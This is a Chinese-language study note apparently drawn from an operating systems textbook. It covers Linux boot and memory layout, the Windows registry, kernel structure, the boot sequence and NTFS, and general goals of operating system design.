C代码也有相当多的初始化要做，但这更多是逻辑上的而不是物理上的。它首先分配一个消息缓冲区来帮助调试引导问题。随着初始化的进行，这里会写入有关正在发生的事情的消息，以便在启动失败后由特殊的诊断程序将其取出。可以把它想象成操作系统的驾驶舱飞行记录器(飞机坠毁后调查人员寻找的黑匣子)。接下来分配内核数据结构。大多数都是固定大小的，但有一些，如页缓存和某些页表结构，取决于可用的RAM数量。此时，系统开始自动配置。使用配置文件告诉可能存在哪些类型的I/O设备，它开始探测设备以查看实际存在哪些设备。如果被探测设备对探测有响应，则将其添加到附加设备表中。如果它没有响应，则假定它不存在并从此忽略它。与传统的UNIX版本不同，Linux设备驱动程序不需要静态链接，可以动态加载(顺便说一句，在所有版本的MS-DOS和Windows中都可以这样做)。

支持和反对动态加载驱动程序的论点很有趣，值得明确说明。动态加载的主要论点是，可以将单个二进制文件发送给具有不同配置的客户，并使其自动加载所需的驱动程序，甚至可能通过网络。反对动态加载的主要理由是安全性。如果您正在运行一个安全的站点，例如银行的数据库或公司的Web服务器，您可能希望任何人都不可能将随机代码插入内核。系统管理员可以将操作系统源文件和目标文件保存在一台安全的机器上，在那里进行所有的系统构建，并通过局域网将内核二进制文件传送到其他机器。如果不能动态加载驱动程序，这种情况可以防止机器操作员和其他知道超级用户密码的人将恶意代码或错误代码注入内核。此外，在大型站点上，硬件配置在系统编译和链接时就已经准确地知道了。更改非常罕见，因此在添加新硬件设备时重新链接系统不是问题。

一旦所有硬件都配置好了，接下来要做的就是小心地手工处理进程0，设置它的堆栈，然后运行它。进程0继续进行初始化，执行诸如编程实时时钟、挂载根文件系统、创建init(进程1)和页面守护进程(进程2)之类的操作。*Init*检查它的标志，看看它是应该出现单用户还是多用户。在前一种情况下，它派生一个执行shell的进程，并等待该进程退出。在后一种情况下，它派生一个进程，该进程执行系统初始化shell脚本/etc/rc，该脚本可以执行文件系统一致性检查、挂载其他文件系统、启动守护进程等等。然后读取/etc/ttys，其中列出了终端及其一些属性。对于每个启用的终端，它派生出自己的一个副本，它做一些家务，然后执行一个名为*getty*的程序。*getty*为每条线路设置线路速度和其他属性(例如，其中一些可能是调制解调器)，然后显示登录入口。



### Memory management in Linux

#### Fundamental concepts

每个Linux进程都有一个地址空间，逻辑上由三个部分组成:文本、数据和堆栈。图中的进程地址空间示例为进程a。**文本段**包含构成程序可执行代码的机器指令。它是由编译器和汇编器通过将C、c++或其他程序翻译成机器码而产生的。文本段通常是只读的。

![image-20231013211315062](D:\TyporaImages\image-20231013211315062.png)

**数据段**包含存储所有程序的变量、字符串、数组和其他数据。它有两部分，初始化数据和未初始化数据。由于历史原因，后者被称为BSS(历史上称为由符号开始的块)。数据段的初始化部分包含在程序启动时需要初始值的变量和编译器常量。加载后，BSS部分中的所有变量都初始化为零。

例如，在C语言中，可以同时声明字符串并初始化它。当程序启动时，它期望字符串具有其初始值。为了实现这种构造，编译器在地址空间中为字符串分配一个位置，并确保在程序启动时，该位置包含正确的字符串。从操作系统的角度来看，初始化数据与程序文本并没有太大的不同，两者都包含编译器产生的位模式，当程序启动时必须将其加载到内存中。

未初始化数据的存在实际上只是一种优化。当全局变量没有显式初始化时，C语言的语义表明它的初始值为0。实际上，大多数全局变量没有显式初始化，因此为0。这可以通过简单地将可执行二进制文件的一个部分与数据字节数完全相等，并初始化所有这些部分来实现，包括默认为0的部分。但是，为了节省可执行文件中的空间，不会这样做。相反，该文件包含程序文本后面的所有显式初始化变量。未初始化的变量都在初始化的变量之后聚集在一起，因此编译器所要做的就是在头文件中放入一个单词，告诉要分配多少字节。

为了更明确地说明这一点，请再次考虑上图。这里的程序文本是8 KB，初始化的数据也是8 KB。未初始化数据(BSS)为4kb。可执行文件只有16 KB(文本+初始化数据)，加上一个简短的头文件，告诉系统在初始化数据之后再分配4 KB，并在启动程序之前将其归零。这个技巧避免了在可执行文件中存储4 KB的零。为了避免分配一个满是零的物理页帧，在初始化期间，Linux分配一个静态零页，一个满是零的写保护页。加载进程时，将其未初始化的数据区域设置为指向零页。每当进程实际尝试在该区域写入时，写时复制机制就会启动，并为该进程分配一个实际的页框架。与不能更改的文本段不同，数据段可以更改。程序一直在修改它们的变量。此外，许多程序需要在执行期间动态分配空间。Linux通过允许数据段随着内存的分配和释放而增长和收缩来处理这个问题。系统调用*brk*可用于允许程序设置其数据段的大小。因此，为了分配更多的内存，程序可以增加其数据段的大小。通常用于分配内存的C库过程的函数为*malloc*。进程地址空间描述符包含有关进程中动态分配的内存区域范围的信息，通常称为堆。

第三段是**堆栈段**。在大多数机器上，它从虚拟地址空间的顶部或顶部附近开始，然后逐渐向0增长。例如，在32位x86平台上，堆栈从地址0xC0000000开始，这是进程在用户模式下可见的3 gb虚拟地址限制。如果堆栈增长到堆栈段的底部以下，则发生硬件故障，操作系统将堆栈段的底部降低一页。程序不显式地管理堆栈段的大小。当程序启动时，它的堆栈不是空的。相反，它包含所有环境(shell)变量以及为shell输入的命令行以调用它。通过这种方式，程序可以发现它的参数。例如，当输入下列程序时，

```sh
cp src dest
```

cp程序将在堆栈中运行字符串“cp src dest”，这样它就可以找出源文件和目标文件的名称。字符串被表示为指向字符串中符号的指针数组，以使解析更容易。

当两个用户运行相同的程序(比如编辑器)时，在内存中同时保存编辑器程序文本的两个副本是可能的，但效率不高。相反，Linux系统支持共享文本段。在上图(a)和(c)中，我们看到两个进程A和B具有相同的文本段。在上图(b)中，我们看到一种可能的物理内存布局，其中两个进程共享同一段文本。映射是由虚拟内存硬件完成的。

数据和堆栈段永远不会共享，除非在fork之后，然后只共享那些没有被修改的页面。如果其中任何一个需要增长，并且没有相邻的空间可以增长，则没有问题，因为相邻的虚拟页不必映射到相邻的物理页。

。。。

## Case study 2: Windows 8

### Programming Windows

![image-20231014083502099](D:\TyporaImages\image-20231014083502099.png)



#### The Windows registry

NT名称空间的根在内核中维护。存储(如文件系统卷)被附加到NT名称空间。由于每次系统引导时都重新构造NT名称空间，因此系统如何知道系统配置的任何特定细节?答案是Windows将一种特殊类型的文件系统(针对小文件进行了优化)附加到NT名称空间。这个文件系统称为注册表。该注册表被组织成单独的卷，称为hives。每个hive保存在一个单独的文件中(在引导卷的目录C: \ Windows \ system32 \ config \中)。当一个Windows系统启动时，一个名为system的特定hive被从引导卷中加载内核和其他引导文件(如引导驱动程序)的同一个引导程序加载到内存中。

Windows在SYSTEM hive中保存了大量的关键信息，包括关于什么驱动程序与什么设备一起使用的信息，什么软件最初运行的信息，以及许多控制系统操作的参数。这些信息甚至被引导程序本身用来确定哪些驱动程序是引导驱动程序，在引导时立即需要。这些驱动程序包括那些理解包含操作系统本身的卷的文件系统和磁盘驱动程序的驱动程序。其他配置组在系统启动后使用，用于描述有关系统上安装的软件、特定用户和系统上安装的用户模式COM(组件对象模型)对象类的信息。本地用户的登录信息保存在安全访问管理器SAM (Security Access Manager)中。网络用户的登录信息由安全hive中的*lsass*服务维护，并与网络目录服务器协调，以便用户可以在整个网络中使用通用的帐户名和密码。hive列表如下：

![image-20231014084413142](D:\TyporaImages\image-20231014084413142.png)

在引入注册表之前，Windows中的配置信息保存在分布在磁盘上的数百个.ini(初始化)文件中。注册表将这些文件收集到一个中央存储中，该存储在引导系统的早期过程中可用。这对于实现Windows即插即用功能非常重要。不幸的是，随着Windows的发展，注册表已经变得严重混乱。关于如何安排配置信息的约定定义得很差，而且许多应用程序采用临时方法。大多数用户、应用程序和所有驱动程序都以完全特权运行，并且经常直接修改注册表中的系统参数——有时会相互干扰并破坏系统的稳定。

### System structure

#### Operating system structure

主要介绍 NTOS层，当Windows启动时从ntoskrnl.exe中加载。NTOS本身由两层组成，执行层包含大多数服务，较小的一层(也称为内核)实现底层线程调度和同步抽象(内核中的内核?)，以及实现陷阱处理程序、中断和CPU管理的其他方面

![image-20231014085418301](D:\TyporaImages\image-20231014085418301.png)

Figure 11-11中最上层是系统库(ntdll.dll)，它实际上以用户模式运行。系统库包括许多用于编译器运行时和低级库的支持函数，类似于UNIX中的libc。dll还包含内核用来初始化线程、调度异常和用户模式apc(异步过程调用)的特殊代码入口点。由于系统库对内核的操作是如此不可或缺，NTOS创建的每个用户模式进程都将ntdll映射到相同的固定地址。当NTOS初始化系统时，它创建一个section对象来映射ntdll，并且它还记录内核使用的ntdll入口点的地址。

在NTOS内核和执行层下面是一个叫做HAL（硬件抽象层）的软件层，它抽象低级硬件细节，如访问设备寄存器和DMA操作，以及主板固件表示配置信息和处理CPU支持芯片差异的方式，如各种中断控制器。最低的软件层是管理程序，Windows称之为Hyper-V。管理程序是一个可选特性，它可以在许多版本的windows中使用，包括专业桌面客户端。hypervisor拦截内核执行的许多特权操作，并以允许多个操作系统同时运行的方式模拟这些操作。每个操作系统都在自己的虚拟机上运行，Windows称之为分区。管理程序使用硬件体系结构中的特性来保护物理内存并提供分区之间的隔离。运行在hypervisor之上的操作系统执行线程，并处理物理处理器抽象（称为虚拟处理器）上的中断。hypervisor在物理处理器上调度虚拟处理器。

主(根)操作系统在根分区中运行。它为其他(来宾)分区提供许多服务。一些最重要的服务提供了客户机与共享设备(如网络和GUI)的集成。虽然在运行Hyper-V时，根操作系统必须是Windows，但其他操作系统(如Linux)也可以在guest分区中运行。客户机操作系统的性能可能非常差，除非对其进行了修改(即半虚拟化)，以便与管理程序一起工作。

内核模式的其他主要组件是设备驱动程序。Windows使用设备驱动程序作为那些不是NTOS或HAL的一部分的内核模式的设备。这包括文件系统、网络协议栈和内核扩展，如防病毒和DRM(数字版权管理)软件，以及用于管理物理设备、连接硬件总线等的驱动程序。I/O和虚拟内存组件合作将设备驱动程序加载(和卸载)到内核内存中，并将它们链接到NTOS和HAL层。I/O管理器提供接口，允许发现、组织和操作设备，包括安排加载适当的设备驱动程序。管理设备和驱动程序的大部分配置信息都保存在注册表的SYSTEM单元中。I/O管理器的即插即用子组件维护有关hardware hive中检测到的硬件的信息，hardware hive是维护在内存中而不是磁盘上的易失性hive，因为每次系统引导时都会完全重新创建它。

#### Booting Windows

运行操作系统需要几个步骤。当计算机打开时，第一个处理器由硬件初始化，然后设置为开始执行内存中的程序。唯一可用的代码是在某种形式的非易失性CMOS存储器中，由计算机制造商初始化(有时由用户在一个称为闪烁的过程中更新)。因为软件保存在内存中，并且很少更新，所以它被称为固件。固件由主板或计算机系统的制造商加载到pc上。历史上PC固件是一个叫做BIOS(基本输入/输出系统)的程序，但是大多数新电脑使用UEFI(统一可扩展固件接口)。UEFI通过支持现代硬件来改进BIOS，提供更模块化的cpu独立架构，并支持简化网络引导、配置新机器和运行诊断的扩展模型。

任何固件的主要目的都是通过首先加载磁盘驱动器分区开头的小引导程序来启动操作系统。Windows引导程序知道如何从文件系统卷或网络中读取足够的信息，以找到独立的Windows BootMgr程序。BootMgr确定系统以前是否已休眠或处于待机模式(特殊的省电模式，允许系统在不从引导过程开始重新启动的情况下重新启动)。如果是，BootMgr加载并执行WinResume.exe。否则，它将加载并执行WinLoad.exe以执行新启动。WinLoad将系统的引导组件加载到内存中：内核/执行程序(通常为ntoskrnl.exe)， HAL (HAL .dll)，包含system hive的文件，Win32k. exe。sys驱动程序包含Win32子系统的内核模式部分，以及SYSTEM hive中列出的作为引导驱动程序的任何其他驱动程序的映像，这意味着系统首次启动时需要它们。如果系统开启了Hyper-V, WinLoad也会加载并启动hypervisor程序。

一旦Windows启动组件被加载到内存中，控制权就移交给NTOS中的低级代码，它继续初始化HAL、内核和执行层，链接驱动程序映像，并访问/更新SYSTEM hive中的配置数据。在初始化所有内核模式组件之后，将创建第一个用户模式进程，用于运行sms .exe程序(类似于UNIX系统中的/etc/init)。最新版本的Windows提供了在引导时提高系统安全性的支持。许多较新的pc包含一个TPM(可信平台模块)，它是在主板上的芯片。芯片是一种安全的密码处理器，可以保护秘密，如加密/解密密钥。系统的TPM可以用来保护系统密钥，例如BitLocker用来加密磁盘的密钥。受保护的密钥只有在TPM验证攻击者没有篡改它们之后才会显示给操作系统。它还可以提供其他加密功能，例如向远程系统证明本地系统上的操作系统没有受到威胁。

Windows启动程序具有处理用户在启动系统失败时遇到的常见问题的逻辑。有时安装一个坏的设备驱动程序，或者运行一个像regedit这样的程序(它会破坏SYSTEM hive)，会阻止系统正常启动。支持忽略最近的更改并引导到系统的最后一个已知的正确配置。其他启动选项包括安全启动，它关闭许多可选的驱动程序，以及恢复控制台，它启动cmd.exe命令行窗口，提供类似于UNIX中单用户模式的体验。

对于用户来说，另一个常见的问题是，有时一些Windows系统似乎非常不稳定，系统和应用程序经常崩溃(似乎是随机的)。从微软的在线崩溃分析程序中获取的数据提供了证据，表明许多崩溃是由于物理内存不足造成的，因此Windows的启动过程提供了运行广泛内存诊断的选项。也许未来的PC硬件通常会支持内存的ECC(或者奇偶校验)，但是今天的大多数台式机、笔记本电脑和手持系统都很容易在它们包含的数百亿内存位中出现哪怕是单个比特的错误。

> 许多关于Windows中的process、内存管理、缓存和I\O不进行介绍

#### The Windows NT file system

FAT-16：用于MS-DOS系统，16位地址，支持2GB（$2^{16}*2^{15}=2^{31}$，16位FAT最大支持$2^{16}$个簇，而每个簇的大小最大为32kB）的磁盘分区

FAT-32：用于可移动媒体（如闪存），32位地址，支持2TB的磁盘分区

NTFS (NT File System)：Windows NT版本，使用64位地址，支持$2^{64}$字节的磁盘分区。

#### Fundamental concepts

NTFS中的单个文件名限制为255个字符;完整路径限制为32,767个字符。文件名采用Unicode格式，允许不使用拉丁字母的国家(例如，希腊、日本、印度、俄罗斯和以色列)的人们用他们的母语编写文件名。

NTFS文件不像FAT -32和UNIX文件那样只是一个线性字节序列。相反，一个文件由多个属性组成，每个属性由一个字节流表示。大多数文件都有一些短流，比如文件名及其64位对象ID，再加上一个包含数据的长(未命名)流。然而，一个文件也可以有两个或多个(长)数据流。每个流都有一个由文件名、冒号和流名组成的名称，如foo:stream1。每个流都有自己的大小，并且可以独立于所有其他流进行锁定。在一个文件中使用多个流的想法在NTFS中并不新鲜。Apple Macintosh上的文件系统每个文件使用两个流，数据分叉和资源分叉。NTFS第一次使用多流是为了允许NT文件服务器为Macintosh客户端服务。多个数据流还用于表示有关文件的元数据，例如Windows GUI中可用的JPEG图像的缩略图。但是，唉，多个数据流是脆弱的，并且在将它们传输到其他文件系统、通过网络传输、甚至在备份和稍后恢复时经常从文件中脱落，因为许多实用程序忽略了它们。

NTFS是一个分层文件系统，类似于UNIX文件系统。组件名称之间的分隔符是“\”，而不是“/”，这是从创建MS-DOS时CP/M的兼容性要求继承而来的(CP/M使用斜杠作为标志)。与UNIX当前工作目录的概念不同，到当前目录(.)和父目录(..)的硬链接是作为约定实现的，而不是作为文件系统设计的基本部分。支持硬链接，但仅用于POSIX子系统，NTFS支持对目录进行遍历检查(UNIX中的' x '权限)。

## Operating system design

### The nature of the design problem

#### goals

对于通用操作系统，首先要考虑四个主要方面：

1. 定义抽象；
2. 提供基本操作；
3. 确保隔离；
4. 管理硬件。

操作系统最重要，但也可能是最困难的任务是定义正确的抽象。其中一些，如进程、地址空间和文件，已经存在了很长时间，因此它们似乎是显而易见的。其他的，如线程，是较新的，不太成熟。例如，如果一个多线程进程有一个线程阻塞等待键盘输入来fork，那么新进程中是否有一个线程也在等待键盘输入？其他抽象涉及同步、信号、内存模型、I/O建模和许多其他领域。每个抽象都可以以具体数据结构的形式实例化。用户可以创建进程、文件、管道等。原始操作控制这些数据结构。例如，用户可以读写文件。原始操作以系统调用的形式实现。从用户的角度来看，操作系统的核心是由抽象和通过系统调用对其进行的操作组成的。由于在某些计算机上，多个用户可以同时登录到一台计算机，因此操作系统需要提供将它们分开的机制。一个用户不得干扰另一个用户。过程概念被广泛用于将资源分组以进行保护。文件和其他数据结构通常也受到保护。

另一个隔离至关重要的地方是虚拟化：管理程序必须确保虚拟机不互相干扰。确保每个用户只能对授权数据执行授权操作是系统设计的一个关键目标。但是，用户也希望共享数据和资源，因此隔离必须是选择性的，并由用户控制。这使得它更加困难。电子邮件程序不应该能够阻碍Web浏览器。即使只有一个用户，也需要隔离不同的进程。有些系统，如Android，会用不同的用户ID启动属于同一用户的每个进程，以保护进程之间的相互影响。与这一点密切相关的是隔离故障的需要。如果系统的某些部分(最常见的是用户进程)出现故障，它不应该影响系统的其余部分。系统设计应确保各部分彼此隔离良好。理想情况下，操作系统的各个部分也应该彼此隔离，以允许独立的故障。更进一步说，也许操作系统应该具有容错和自我修复功能：最后，操作系统必须管理硬件。特别是，它必须照顾所有底层芯片，如中断控制器和总线控制器。它还必须提供一个框架，允许设备驱动程序管理较大的I/O设备，如磁盘、打印机和显示器。

> 许多内容没有记录
